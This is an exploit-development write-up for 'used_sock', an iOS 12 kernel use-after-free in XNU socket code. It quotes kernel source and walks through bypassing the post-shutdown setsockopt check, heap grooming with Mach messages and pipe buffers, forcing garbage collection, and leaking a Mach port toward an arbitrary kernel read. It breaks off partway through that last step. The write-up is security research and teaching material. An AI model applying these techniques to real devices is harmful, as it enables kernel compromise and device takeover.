# used_sock

used_sock is a kernel exploit named after a use-after-free due to a dangling pointer in socket-related code. You can find more information [here](https://bugs.chromium.org/p/project-zero/issues/detail?id=1806). The bug affects iOS 12-12.2, was patched in iOS 12.3, accidentally *re-introduced* in iOS 12.4, and then killed again in iOS 12.4.1. This bug was found by [Ned Williamson](https://twitter.com/NedWilliamson) of Google Project Zero, not me, I'm just writing an exploit for it.

For a bit of background, I got into reverse engineering sometime in 2014 and love messing with iOS internals. I have done a brief number of projects which have served as fantastic learning experiences. I've always been fond of jailbreaks and the exploits behind them. I briefly got into exploit development in 2017-2018 with [Billy Ellis' exploit challenges](https://github.com/Billy-Ellis/Exploit-Challenges) then kind of "stopped" as I didn't really know where to go from there. In the fall of 2018 I started writing a [debugger](https://github.com/jsherman212/iosdbg) targeting jailbroken iOS. I worked on that for about a year and three months and have hit a good stopping point. However, during that time I wanted to get back into exploit development and pursue iOS security research but I kept getting sucked back into the debugger. My winter break was six weeks, so I swore to myself I'd write my first iOS kernel exploit by the time I had to go back to school. You can find it [here](https://github.com/jsherman212/1032exploit). Writing that exploit was the best three weeks I've had in a long time. I am extremely grateful for all the people/resources that make it possible to get started.

Also, if you happen to see any mistakes I made, please tell me about them. My twitter is at the end of this writeup.

## The Bug
When calling `disconnectx` on a TCP socket, we'll eventually hit this function:

```
void
in6_pcbdetach(struct inpcb *inp)
{
	struct socket *so = inp->inp_socket;

	...

	if (!(so->so_flags & SOF_PCBCLEARING)) {
		struct ip_moptions *imo;
		struct ip6_moptions *im6o;

		inp->inp_vflag = 0;
		if (inp->in6p_options != NULL) {
			m_freem(inp->in6p_options);
			inp->in6p_options = NULL;
		}
		ip6_freepcbopts(inp->in6p_outputopts);
		ROUTE_RELEASE(&inp->in6p_route);
		/* free IPv4 related resources in case of mapped addr */
		if (inp->inp_options != NULL) {
			(void) m_free(inp->inp_options);
			inp->inp_options = NULL;
		}
		im6o = inp->in6p_moptions;
		inp->in6p_moptions = NULL;

		imo = inp->inp_moptions;
		inp->inp_moptions = NULL;

		sofreelastref(so, 0);
		inp->inp_state = INPCB_STATE_DEAD;
		/* makes sure we're not called twice from so_close */
		so->so_flags |= SOF_PCBCLEARING;

		inpcb_gc_sched(inp->inp_pcbinfo, INPCB_TIMER_FAST);

		/*
		 * See inp_join_group() for why we need to unlock
		 */
		if (im6o != NULL || imo != NULL) {
			socket_unlock(so, 0);
			if (im6o != NULL)
				IM6O_REMREF(im6o);
			if (imo != NULL)
				IMO_REMREF(imo);
			socket_lock(so, 0);
		}
	}
}
```
<sup>*[xnu-4903.221.2/bsd/netinet6/ip6_pcb.c](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/in6_pcb.c#L635)*</sup>

You'll notice a pattern of "free, NULL", except around this line:
`ip6_freepcbopts(inp->in6p_outputopts);`. Taking a look at `ip6_freepcbopts`:

```
void
ip6_freepcbopts(struct ip6_pktopts *pktopt)
{
	if (pktopt == NULL)
		return;

	ip6_clearpktopts(pktopt, -1);

	FREE(pktopt, M_IP6OPT);
}
```
<sup>*[xnu-4903.221.2/bsd/netinet6/ip6_output.c](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/ip6_output.c#L3344)*</sup>

`inp->in6p_outputopts` is freed but never NULL'ed out. `in6p_outputopts` is a macro<sup>*[xnu-4903.221.2/bsd/netinet/in_pcb.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet/in_pcb.h#L490)*</sup> that expands to `inp_depend6.inp6_outputopts`, which is a pointer to an `ip6_pktopts` struct:

```
struct	ip6_pktopts {
	struct	mbuf *ip6po_m;	/* Pointer to mbuf storing the data */
	int	ip6po_hlim;	/* Hoplimit for outgoing packets */

	/* Outgoing IF/address information */
	struct	in6_pktinfo *ip6po_pktinfo;

	/* Next-hop address information */
	struct	ip6po_nhinfo ip6po_nhinfo;

	struct	ip6_hbh *ip6po_hbh; /* Hop-by-Hop options header */

	/* Destination options header (before a routing header) */
	struct	ip6_dest *ip6po_dest1;

	/* Routing header related info. */
	struct	ip6po_rhinfo ip6po_rhinfo;

	/* Destination options header (after a routing header) */
	struct	ip6_dest *ip6po_dest2;

	int	ip6po_tclass;	/* traffic class */

	int	ip6po_minmtu;  /* fragment vs PMTU discovery policy */
#define	IP6PO_MINMTU_MCASTONLY	-1 /* default; send at min MTU for multicast */
#define	IP6PO_MINMTU_DISABLE	 0 /* always perform pmtu disc */
#define	IP6PO_MINMTU_ALL	 1 /* always send at min MTU */

	/* whether temporary addresses are preferred as source address */
	int	ip6po_prefer_tempaddr;

#define	IP6PO_TEMPADDR_SYSTEM	-1 /* follow the system default */
#define	IP6PO_TEMPADDR_NOTPREFER 0 /* not prefer temporary address */
#define	IP6PO_TEMPADDR_PREFER	 1 /* prefer temporary address */

	int ip6po_flags;
#if 0	/* parameters in this block is obsolete. do not reuse the values. */
#define	IP6PO_REACHCONF	0x01	/* upper-layer reachability confirmation. */
#define	IP6PO_MINMTU	0x02	/* use minimum MTU (IPV6_USE_MIN_MTU) */
#endif
#define	IP6PO_DONTFRAG		0x04	/* no fragmentation (IPV6_DONTFRAG) */
#define	IP6PO_USECOA		0x08	/* use care of address */
};
```
<sup>*[xnu-4903.221.2/bsd/netinet6/ip6_var.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/ip6_var.h#L208)*</sup>

This structure is written to and initialized with `setsockopt`. It's read from with `getsockopt`.

To initialize it, we just have to call `setsockopt` with some arbitrary option, and we'll hit this code:

```
static int
ip6_pcbopt(int optname, u_char *buf, int len, struct ip6_pktopts **pktopt,
    int uproto)
{
	struct ip6_pktopts *opt;

	opt = *pktopt;
	if (opt == NULL) {
		opt = _MALLOC(sizeof (*opt), M_IP6OPT, M_WAITOK);
		if (opt == NULL)
			return (ENOBUFS);
		ip6_initpktopts(opt);
		*pktopt = opt;
	}

	return (ip6_setpktopt(optname, buf, len, opt, 1, 0, uproto));
}
```
<sup>*[xnu-4903.221.2/bsd/netinet6/ip6_output.c](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/ip6_output.c#L3108)*</sup>

Same deal with setting other options after it's been initialized.

So if we're quick, we can reallocate the memory pointed to by `inp->in6p_outputopts` after we shutdown the socket. But then what? We control its contents, and we can read from it without a problem (there is nothing that checks if the socket is disconnected in `ip6_getpcbopt`). Attempting to write to the freed struct by calling `setsockopt` on a disconnected socket causes `sosetoptlock` to bail with `EINVAL`:

```
if ((so->so_state & (SS_CANTRCVMORE | SS_CANTSENDMORE)) ==
	    (SS_CANTRCVMORE | SS_CANTSENDMORE) &&
	    (so->so_flags & SOF_NPX_SETOPTSHUT) == 0) {
		/* the socket has been shutdown, no more sockopt's */
		error = EINVAL;
		goto out;
}
```
<sup>*[xnu-4903.221.2/bsd/kern/uipc_socket.c](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/kern/uipc_socket.c#L4784)*</sup>

This check is pretty much the only thing standing between us and writing to the freed struct. How can we make this check fail? Thankfully for us, XNU has provides the option `SO_NP_EXTENSIONS` and a single flag, `SONPX_SETOPTSHUT`:

```
struct so_np_extensions {
	u_int32_t	npx_flags;
	u_int32_t	npx_mask;
};

#define SONPX_SETOPTSHUT    0x000000001 /* flag for allowing setsockopt after shutdown */
```
<sup>*[xnu-4903.221.2/bsd/sys/socket.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/sys/socket.h#L505)*</sup>

And upon setting the `SONPX_SETOPTSHUT` flag, `SOF_NPX_SETOPTSHUT` gets OR'ed into `so->so_flags`...

```
if ((sonpx.npx_mask & SONPX_SETOPTSHUT)) {
	if ((sonpx.npx_flags & SONPX_SETOPTSHUT))
		so->so_flags |= SOF_NPX_SETOPTSHUT;
	else
		so->so_flags &= ~SOF_NPX_SETOPTSHUT;
}
```
<sup>*[xnu-4903.221.2/bsd/kern/uipc_socket.c](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/kern/uipc_socket.c#L5092)*</sup>

...which is just what we needed for that check to fail.

## Exploitation
The goal is to get a userland handle to a controlled Mach port. That was pretty straightforward while exploiting [CVE-2017-13861](https://bugs.chromium.org/p/project-zero/issues/detail?id=1417) because the bug dealt directly with an over-released Mach port. If we're lucky enough, (after doing some intermediary work) we'd be able to reallocate that port with controlled contents, while retaining a valid userland handle to it. Since this bug doesn't deal with an over-released Mach port, we have to figure something else out.

### Reallocating an `ip6_pktopts` struct with controlled contents
The first thing is to replicate the `ip6_pktopts` struct for use in the exploit.

```
struct route_in6 {
    uint64_t ro_rt;
    uint64_t ro_lle;
    uint64_t ro_srcia;
    uint32_t ro_flags;
    struct sockaddr_in6 ro_dst;
};
```
<sup>*[xnu-4903.221.2/bsd/netinet6/in6.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/in6.h#L477)*</sup>

```
struct ip6_pktopts {
    uint64_t ip6po_m;
    int ip6po_hlim;
    uint64_t ip6po_pktinfo;
    struct {
        uint64_t ip6po_nhi_nexthop;
        struct route_in6 ip6po_nhi_route;
    } ip6po_nhinfo;
    uint64_t ip6po_hbh;
    uint64_t ip6po_dest1;
    struct {
        uint64_t ip6po_rhi_rthdr;
        struct route_in6 ip6po_rhi_route;
    } ip6po_rhinfo;
    uint64_t ip6po_dest2;
    int ip6po_tclass;
    int ip6po_minmtu;
    int ip6po_prefer_tempaddr;
    int ip6po_flags;
};
```
<sup>*[xnu-4903.221.2/bsd/netinet6/ip6_var.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/ip6_var.h#L208)*</sup>

Replicating this struct wasn't as much of a headache as I thought it would be. The only other struct which needed to be replicated was `struct route_in6` because `ip6po_nfinfo.ip6po_nhi_route` and `ip6po_rhinfo.ip6po_rhi_route` are not pointers. The others can be found in `<netinet/in.h>`.

Before we continue, it's important to understand the kernel "heap" is set up. It's split into many different zones. Some zones contain elements of varying sizes and types, as long as those elements are less than or equal to zone's `elem_size`, like the `kalloc` zones, and others are dedicated to holding elements of the same size and type, like the `ipc.ports` zone for Mach ports and the `ipc.vouchers` zone for Mach vouchers. A feature of the zone allocator is garbage collection, where a page of memory from any zone containing all free elements are returned back for future use by other zones. It's an incredibly useful thing to abuse. For example, since Mach ports are in their own zone, and there isn't any way to spray (useful) controlled data into `ipc.ports`, we can allocate an entire page of Mach ports, free them all, force garbage collection to send that page back to the zone allocator, and hopefully snatch it back for a `kalloc` allocation. `zprint(1)` shows you information about the kernel zones. Here's the different `kalloc` zones on my Macbook (command shamelessly stolen from [PsychoTea](https://twitter.com/ibsparkes/)'s [machswap writeup](https://sparkes.zone/blog/ios/2019/04/30/machswap-ios-12-kernel-exploit.html))

```
$ sudo zprint | awk 'NR<=3 || /kalloc/'
                            elem         cur         max        cur         max         cur  alloc  alloc
zone name                   size        size        size      #elts       #elts       inuse   size  count
-------------------------------------------------------------------------------------------------------------
kalloc.16                     16      17320K      19951K    1108480     1276896     1060838     4K    256  C
kalloc.32                     32       6640K       8867K     212480      283754      167654     4K    128  C
kalloc.48                     48      10868K      13301K     231850      283754      223454     4K     85  C
kalloc.64                     64      21584K      29927K     345344      478836      339291     4K     64  C
kalloc.80                     80       5924K       8867K      75827      113501       69303     4K     51  C
kalloc.96                     96       2736K       5254K      29184       56050       25280     8K     85  C
kalloc.128                   128      12532K      13301K     100256      106408       99488     4K     32  C
kalloc.160                   160       2724K       3503K      17433       22420       16597     8K     51  C
kalloc.192                   192       8904K      11823K      47488       63056       46392    12K     64  C
kalloc.224                   224       4468K       7006K      20425       32028       18582    16K     73  C
kalloc.256                   256       4476K       5911K      17904       23646       17775     4K     16  C
kalloc.288                   288       3420K       5838K      12160       20759       11058    20K     71  C
kalloc.368                   368      12196K      14012K      33936       38991       32114    32K     89  C
kalloc.400                   400       7580K       8757K      19404       22420       18602    20K     51  C
kalloc.512                   512      53620K      67336K     107240      134672      106302     4K      8  C
kalloc.576                   576        188K        230K        334         410         303     4K      7  C
kalloc.768                   768       9024K      17734K      12032       23646       11543    12K     16  C
kalloc.1024                 1024      24048K      29927K      24048       29927       23699     4K      4  C
kalloc.1152                 1152       1240K       1556K       1102        1383         985     8K      7  C
kalloc.1280                 1280        280K       1153K        224         922         153    20K     16  C
kalloc.1664                 1664        504K       1614K        310         993         283    28K     17  C
kalloc.2048                 2048      13908K      19951K       6954        9975        6930     4K      2  C
kalloc.4096                 4096       6732K      19951K       1683        4987        1677     4K      1  C
kalloc.6144                 6144       1068K       1556K        178         259         172    12K      2  C
kalloc.8192                 8192       3744K       7882K        468         985         453     8K      1  C
```

Of course, there are many more other zones than this, but the `kalloc` zones are what we're going to be focusing on. You're able to see the different `kalloc` zones that are present in a given version of XNU by looking at `osfmk/kern/kalloc.c`. It varies across different versions, but `xnu-4903.221.2` defines the kalloc zones like this (with 32-bit specific and error handling code removed):

```
static const struct kalloc_zone_config {
	int kzc_size;
	const char *kzc_name;
} k_zone_config[] = {
#define KZC_ENTRY(SIZE) { .kzc_size = (SIZE), .kzc_name = "kalloc." #SIZE }
	/* 64-bit targets, generally */
	KZC_ENTRY(16),
	KZC_ENTRY(32),
	KZC_ENTRY(48),
	KZC_ENTRY(64),
	KZC_ENTRY(80),
	KZC_ENTRY(96),
	KZC_ENTRY(128),
	KZC_ENTRY(160),
	KZC_ENTRY(192),
	KZC_ENTRY(224),
	KZC_ENTRY(256),
	KZC_ENTRY(288),
	KZC_ENTRY(368),
	KZC_ENTRY(400),
	KZC_ENTRY(512),
	KZC_ENTRY(576),
	KZC_ENTRY(768),
	KZC_ENTRY(1024),
	KZC_ENTRY(1152),
	KZC_ENTRY(1280),
	KZC_ENTRY(1664),
	KZC_ENTRY(2048),
	
	/* all configurations get these zones */
	KZC_ENTRY(4096),
	KZC_ENTRY(6144),
	KZC_ENTRY(8192),
	KZC_ENTRY(16384),
	KZC_ENTRY(32768),
#undef KZC_ENTRY
};
```
<sup>*[xnu-4903.221.2/osfmk/kern/kalloc.c](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/osfmk/kern/kalloc.c#L150)*</sup>

Now that we understand how the zone allocator works, let's go back to this code:

```
static int
ip6_pcbopt(int optname, u_char *buf, int len, struct ip6_pktopts **pktopt,
    int uproto)
{
	struct ip6_pktopts *opt;

	opt = *pktopt;
	if (opt == NULL) {
		opt = _MALLOC(sizeof (*opt), M_IP6OPT, M_WAITOK);
		if (opt == NULL)
			return (ENOBUFS);
		ip6_initpktopts(opt);
		*pktopt = opt;
	}

	return (ip6_setpktopt(optname, buf, len, opt, 1, 0, uproto));
}
```
<sup>*[xnu-4903.221.2/bsd/netinet6/ip6_output.c](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/netinet6/ip6_output.c#L3108)*</sup>

`_MALLOC` is a macro around `__MALLOC`. `__MALLOC` eventually calls `kalloc_canblock`. `kalloc_canblock` chooses the appropriate `kalloc` zone based on the size of the allocation. After a zone has been chosen, `kalloc_canblock` calls `zalloc_canblock_tag`, which finally calls `zalloc_internal`, returning a free block of memory from the specified zone. So our `ip6_pktopts` struct is allocated in a `kalloc` zone, but which one? On an iPhone SE running iOS 12.0, `sizeof(struct ip6_pktopts)` is 192, which fits perfectly into the `kalloc.192` zone. So after freeing a bunch of vulnerable sockets, we need to spray `kalloc.192` with fake `ip6_pktopts` structs. One of the freed `ip6_pktopts` would get reallocated with controlled contents, and... that's it. We'd have no way (except by freeing/reallocating again, which obliterates reliability) of updating the fields of that controlled struct to trick the kernel into reading out its own memory, so we have to figure out something else.

#### Pipe buffers
A pipe is a communication mechanism between different processes. It has a read end (`0`) and a write end (`1`). If a process calls `write` to send some data via the pipe, another process can call `read` to extract that data. In the kernel, a pipe is represented with this struct:

```
struct pipe {
	struct	pipebuf pipe_buffer;	/* data storage */
#ifdef PIPE_DIRECT
	struct	pipemapping pipe_map;	/* pipe mapping for direct I/O */
#endif
	struct	selinfo pipe_sel;	/* for compat with select */
	pid_t	pipe_pgid;		/* information for async I/O */
	struct	pipe *pipe_peer;	/* link with other direction */
	u_int	pipe_state;		/* pipe status info */
	int	pipe_busy;		/* busy flag, mostly to handle rundown sanely */
	TAILQ_HEAD(,eventqelt) pipe_evlist;
	lck_mtx_t *pipe_mtxp;		/* shared mutex between both pipes */
	struct	timespec st_atimespec;	/* time of last access */
	struct	timespec st_mtimespec;	/* time of last data modification */
	struct	timespec st_ctimespec;	/* time of last status change */
	struct	label *pipe_label;	/* pipe MAC label - shared */
};
```
<sup>*[xnu-4903.221.2/bsd/sys/pipe.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/sys/pipe.h#L150)*</sup>

The `pipe_buffer`, apart from keeping track of a few other things, has a pointer to a buffer that contains the data written to the pipe. Taking a look at `struct pipebuf`:

```
struct pipebuf {
	u_int	cnt;		/* number of chars currently in buffer */
	u_int	in;		/* in pointer */
	u_int	out;		/* out pointer */
	u_int	size;		/* size of buffer */
	caddr_t	buffer;		/* kva of buffer */
};
```
<sup>*[xnu-4903.221.2/bsd/sys/pipe.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/sys/pipe.h#L101)*</sup>

`cnt` and `size` are self-explanatory. `in` and `out` are offsets from the start of `buffer`. `cnt`, `in`, and `out` change in accordance to calls to `read` and `write`. For example, let's say we start with a pipe buffer without anything in it. `cnt`, `in`, `out`, will be `0`.

If we `write` `0x20` bytes, `cnt` will be `0x20`, `in` will be `0x20`, and `out` will still be `0`.

If we `read` `0x10` bytes, `cnt` will be `0x10`, `in` will still be `0x20`, and `out` will be `0x10`.

If we `write` `0x50` bytes, `cnt` will be `0x60`, `in` will be `0x70`, and `out` will still be `0x10`.

If we `read` `0x40` bytes, `cnt` will be `0x20`, `in` will be still `0x70`, and `out` will be `0x50`.

Reading `x` bytes decreases `cnt` by `x` and increases `out` by `x`. `in` is unchanged.

Writing `y` bytes increases `cnt` by `y` and increases `in` by `y`. `out` is unchanged.

Knowing how `cnt`, `in`, and `out` change across calls to `read` and `write` isn't important to how I went about exploiting this bug, but I felt that briefly covering that was better than not acknowledging it at all.

We can use a pipe buffer to store arbitrary data in the kernel. Instead of outright spraying fake `ip6_pktopts` structs, we would spray pipe buffers containing a fake `ip6_pktopts` struct. If one of the freed structs were reallocated with one of those fake pipe buffer-backed structs, the problem of updating its fields would be solved. To update the fields of our reallocated struct, we'd simply `read` out the entirety of the pipe buffer into an `ip6_pktopts` struct variable, update its fields, then `write` it back into the pipe buffer. An additional bonus is because the allocation backing our controlled `ip6_pktopts` struct lives in kernel space, SMAP won't be an issue. SMAP (Supervisor Mode Access Prevention), introduced in A10 chips, prevents the kernel from freely dereferencing userland pointers.

Pipes live in their own zone, `pipe zone`, but the pipe buffer is allocated from the `kalloc` family of zones. This is great for us because `ip6_pktopts` structs are also `kalloc` allocations. But what `kalloc` zone does a pipe buffer get allocated from? When you create a pipe, its associated pipe buffer isn't allocated until you call `write`. Calling `write` on a pipe causes `pipe_write` to get called, and if the pipe buffer hasn't been created yet, `choose_pipespace` is called to select the appropriate `kalloc` zone based on the size of written data. `choose_pipespace` uses an array of `kalloc` zones to make its decision:

```
static const unsigned int pipesize_blocks[] = {512,1024,2048,4096, 4096 * 2, PIPE_SIZE , PIPE_SIZE * 4 };
```
<sup>*[xnu-4903.221.2/bsd/kern/sys_pipe.c](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/bsd/kern/sys_pipe.c#L337)*</sup>

There's an issue. The smallest `kalloc` zone for a pipe buffer is `kalloc.512`, and an `ip6_pktopts` struct is allocated from `kalloc.192`. We can't spray pipe buffers and ever expect to reallocate one with a freed `ip6_pktopts` struct because they come from different zones. However, if we allocate a bunch of `ip6_pktopts` structs, free them, trigger garbage collection, the pages with those structs will be sent back to the zone allocator, ready to be used for a brand new `kalloc.512` pipe buffer allocation. It's a simple idea, but not as straightforward in code. Triggering garbage collection was the biggest headache I faced while writing this exploit.

#### Reallocating the struct

Garbage collection will trigger when the [zone map is 95% full](https://github.com/benjibobs/async_wake/blob/829efd13f9af3746044861cd4426e30431915678/README#L153). All devices have the same sized zone map, 384 MB, so triggering garbage collection is just a matter of filling it up. A great way to create controlled `kalloc` allocations is by sending a Mach message containing out of line ports (non-64 bit specific code removed).

```
typedef struct
{
  void*				address;
  boolean_t     		deallocate: 8;
  mach_msg_copy_options_t       copy: 8;
  mach_msg_type_name_t		disposition : 8;
  mach_msg_descriptor_type_t	type : 8;
  mach_msg_size_t		count;
} mach_msg_ool_ports_descriptor_t;
```
<sup>*[xnu-4903.221.2/osfmk/mach/message.h](https://github.com/apple/darwin-xnu/blob/a449c6a3b8014d9406c2ddbdc81795da24aa7443/osfmk/mach/message.h#L356)*</sup>

`address` points to a userland allocation of `count` Mach port names. When you send a Mach message containing out of line ports, the kernel will take each 32 bit Mach port name, convert it to a 64 bit pointer, and allocate a `kalloc`'ed buffer for however many ports there are. For example, if we want to allocate from `kalloc.256`, we would only send 32 out of line ports because `256/8 == 32`. So if you wanted to allocate memory from `kalloc` zone `n`, you would send `n/8` out of line ports. In order to free an OOL port buffer, you would call `mach_port_destroy` on the destination port of the message.

It's time to try and get a dangling pointer to an `ip6_pktopts` struct reallocated with a `kalloc.512` pipe buffer. But we need to think ahead. If we reallocate one of those `ip6_pktopts` structs, we'll be able to build an arbitrary kernel read. But we'll have no place to start looking for the pointers we need to build a fake tfp0 port. Trying to guess pointers is ridiculous so we have to think of something else. I'm sure you remember reading about OOL-port-containing Mach messages half a minute ago. A leaked Mach port pointer is the key to turning a somewhat useless (in this context) future kernel read into a strong primitive that can eventually get us the kernel base, the kernel slide, and the pointers for a fake tfp0 port. New plan: instead of only spraying pipe buffers, we're going to alternate between spraying pipe buffers and creating `kalloc.512` OOL port allocations with a Mach port created in userland. I'm going to call that port `leaked_port`. That way, some of the dangling `ip6_pktopts` structs will overlap with `kalloc.512` pipe buffers and some will overlap with a bunch of pointers to the underlying `struct ipc_port` `leaked_port` represents in the kernel. In order to distinguish `leaked_port` from other Mach ports in kernelspace, we're going to set its `ip_context` to a recognizeable value, like `0x1122334455667788`. `ip_context` is a field within `struct ipc_port`. It can be written to with `mach_port_set_context` and read from with `mach_port_get_context`.

The first thing to do is create an array of vulnerable sockets, an array of pipes, and the Mach port we're going to leak. We need to fill up the zone map, but we don't want to fill it up too much, as garbage collection would trigger early, causing the exploit to fail. Through experimentation I found that filling 90% of it with pagesized allocations sets us up to reliably trigger garbage collection later. Why pagesized allocations? Because garbage collection only sends pages with all free elements back to the zone allocator. What better way allows for complete control over a page of memory than controlling its only allocation? We create dangling pointers to `inp_depend6.inp6_outputopts` for each socket by calling `disconnectx`, then we try and trigger garbage collection. Another set of pagesized allocations are going to be made, but this time, at the expense of only 60% of the zone map. Of course, we only have enough space in the zone map for another 10%, but I found doing this not only triggers garbage collection, but prevents "zone map exhausted" panics if the exploit fails a couple times in a row or garbage collection is not triggered in a timely manner.

Garbage collection will trigger sometime while allocating the second set of pagesized allocations. We'll know it has triggered if we measure the time it takes to send one of our OOL Mach messages. We call `mach_absolute_time` before and after sending a message and then subtract the "after" with the "before" for the elapsed time. I hesitate to use any other word than "time", because according to an old [Apple Technical Q&A Document](https://developer.apple.com/library/archive/qa/qa1398/_index.html), the units of `mach_absolute_time` are "in terms of the Mach absolute time unit". I've got no idea what that means so I'll stick to "time". Anyway, after a lot of experimentation, garbage collection seems to have triggered when the elapsed time is greater than 100000.

Garbage collection has triggered and we have one chance to pull this off. As said before, we're going to be alternating between creating a `kalloc.512` pipe buffer and a `kalloc.512` OOL port allocation with `leaked_port`. We're going to be doing this inside a loop bounded by the number of pipes in the pipe array I mentioned earlier, which is 3100. 3100 doesn't really mean anything, that number was merely the result of me trying to increase exploit success rate. Anyway, since we're alternating between pipe buffers and OOL allocations, 1550 of each are going to be created. When I create a pipe buffer and send in a fake `ip6_pktopts` struct, I'm going to record a magic value, `0xcafe`, in the upper 16 bits of the `ip6po_minmtu` field. I'll also record the index of the pipe being written to in the lower 16 bits. This will come in handy later. We also need to go slow because we didn't wait for the garbage collection to actually finish, hence the calls to `pthread_yield_np` and `usleep`.

If all went well, several freed `ip6_pktopts` structs were reallocated with pipe buffers and kernel pointers to `leaked_port`. To check for reallocated `ip6_pktopts` structs, we're going to loop through the array of sockets, read out the value of `ip6po_minmtu` with `getsockopt`, and check if the top 16 bits of it is equal to `0xcafe`. If it is, we've found our `evil_socket`! We'll read the bottom 16 bits for the index of the pipe the reallocated `ip6_pktopts` struct resides in, granting us our `evil_pipe`. We'll call `read` and `write` on `evil_pipe` to update our reallocated `ip6_pktopts` struct, and we'll use `evil_socket` with `getsockopt` and `setsockopt` to have the kernel interact with it. We'll also check for overlapped kernel pointers to `leaked_port`. If a freed `ip6_pktopts` struct got reallocated with a bunch of kernel pointers, the top 32 bits of one would reside in `ip6po_minmtu` and the bottom 32 bits would reside in `ip6po_tclass`. Kernel pointers are very distinct, usually looking something like `0xffffff(e|f)[A-Fa-f0-9]{9}`. We can simply apply a bitmask to whatever number results from `((uint64_t)minmtu << 32) | tclass`, and if it looks like a kernel pointer, we'll add it to an array of possible kernel pointers. Why an array? Because it's possible the memory that some of our freed `ip6_pktopts` structs were reallocated with is neither a pipe buffer nor from an OOL port allocation, but a pointer to something entirely different. Our code is only checking if the aforementioned number *looks* like a kernel pointer. At this point, we have no way of knowing what a given pointer points to.

Once we've got our `evil_socket`, `evil_pipe`, and array of kernel pointers, it's time to leak the address to `leaked_port`. But how can we know if a pointer points to `leaked_port`? Remember how many OOL allocations we made with `leaked_port` while trying to reallocate our freed `ip6_pktopts` structs? It was 1550, so logically, there should be an abundance of pointers to `leaked_port` in the kernel pointer array. Looping through the array and checking which pointer occurs the most is sufficient to leak the address of `leaked_port`. Only once did this strategy fail in the hundreds of times I've ran this exploit. But just to be safe, we need to make sure this pointer is in fact `leaked_port`. Remember how we set `leaked_port`'s `ip_context` to `0x1122334455667788` earlier? We have to check for that. But there's an issue: we cannot pass a kernel pointer to `mach_port_get_context`. It needs to be a userland Mach port name. A way to read arbitrary kernel memory would *really* come in handy at this point. If we had one now, we could read out 64 bits from the possible kernel pointer to `leaked_port` plus the offset of the `ip_context` field in `struct ipc_port` to verify if it is `0x1122334455667788`.

### Building an arbitrary kernel read
We control an `ip6_pktopts` struct, so let's take a look at what we can do with it. Based on `option_name` in a call to `getsockopt`, `ip6_getpcbopt` will be called to fetch the option's value. Then it calls `sooptcopyout` to `copyout` the option's value into the `sopt_val` field of the `sopt` parameter. We'll use `evil_socket` in the calls to `getsockopt` to have the kernel work with our controlled `ip6_pktopt` struct. For reference, here is the function definition for `copyout` from its `man` page:

```
int copyout(const void	*kaddr,	void *uaddr, size_t len);
```

`copyout` simply copies `len` bytes from `kaddr` into `uaddr`. If we control `kaddr`, we can build an arbitrary kernel read.

I included the entire function so we can go through each option to figure out what will work and what won't.

```
static int
ip6_getpcbopt(struct ip6_pktopts *pktopt, int optname, struct sockopt *sopt)
{
	void *optdata = NULL;
	int optdatalen = 0;
	struct ip6_ext *ip6e;
	struct in6_pktinfo null_pktinfo;
	int deftclass = 0, on;
	int defminmtu = IP6PO_MINMTU_MCASTONLY;
	int defpreftemp = IP6PO_TEMPADDR_SYSTEM;


	switch (optname) {
	case IPV6_PKTINFO:
		if (pktopt && pktopt->ip6po_pktinfo)
			optdata = (void *)pktopt->ip6po_pktinfo;
		else {
			/* XXX: we don't have to do this every time... */
			bzero(&null_pktinfo, sizeof (null_pktinfo));
			optdata = (void *)&null_pktinfo;
		}
		optdatalen = sizeof (struct in6_pktinfo);
		break;

	case IPV6_TCLASS:
		if (pktopt && pktopt->ip6po_tclass >= 0)
			optdata = (void *)&pktopt->ip6po_tclass;
		else
			optdata = (void *)&deftclass;
		optdatalen = sizeof (int);
		break;

	case IPV6_HOPOPTS:
		if (pktopt && pktopt->ip6po_hbh) {
			optdata = (void *)pktopt->ip6po_hbh;
			ip6e = (struct ip6_ext *)pktopt->ip6po_hbh;
			optdatalen = (ip6e->ip6e_len + 1) << 3;
		}
		break;

	case IPV6_RTHDR:
		if (pktopt && pktopt->ip6po_rthdr) {
			optdata = (void *)pktopt->ip6po_rthdr;
			ip6e = (struct ip6_ext *)pktopt->ip6po_rthdr;
			optdatalen = (ip6e->ip6e_len + 1) << 3;
		}
		break;

	case IPV6_RTHDRDSTOPTS:
		if (pktopt && pktopt->ip6po_dest1) {
			optdata = (void *)pktopt->ip6po_dest1;
			ip6e = (struct ip6_ext *)pktopt->ip6po_dest1;
			optdatalen = (ip6e->ip6e_len + 1) << 3;
		}
		break;

	case IPV6_DSTOPTS:
		if (pktopt && pktopt->ip6po_dest2) {
			optdata = (void *)pktopt->ip6po_dest2;
			ip6e = (struct ip6_ext *)pktopt->ip6po_dest2;
			optdatalen = (ip6e->ip6e_len + 1) << 3;
		}
		break;

	case IPV6_NEXTHOP:
		if (pktopt && pktopt->ip6po_nexthop) {
			optdata = (void *)pktopt->ip6po_nexthop;
			optdatalen = pktopt->ip6po_nexthop->sa_len;
		}
		break;

	case IPV6_USE_MIN_MTU:
		if (pktopt)
			optdata = (void *)&pktopt->ip6po_minmtu;
		else
			optdata = (void *)&defminmtu;
